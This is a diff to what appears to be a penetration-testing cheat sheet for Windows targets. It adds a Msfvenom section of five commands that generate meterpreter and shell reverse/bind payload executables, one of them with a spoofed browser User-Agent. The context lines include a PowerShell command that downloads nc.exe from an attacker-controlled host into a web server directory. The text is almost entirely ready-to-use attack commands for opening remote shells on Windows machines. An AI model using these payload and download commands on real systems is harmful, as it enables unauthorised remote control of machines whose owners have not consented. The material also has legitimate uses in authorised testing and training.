@@ -25,6 +25,15 @@ Generate exe with msfvenom, upload nc, socat, powercat. Find upload point / code
 Upload pages, certutil, powershell
 
     powershell Invoke-WebRequest -Uri http://192.168.119.149:8888/nc.exe -OutFile C:\xampp\htdocs\nc.exe  
+    
+### Msfvenom 
+
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	
+   msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe	
+   msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe	
+   msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	
+   msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
+   
 ### Netcat
 upload static binary nc.exe and invoke 
 
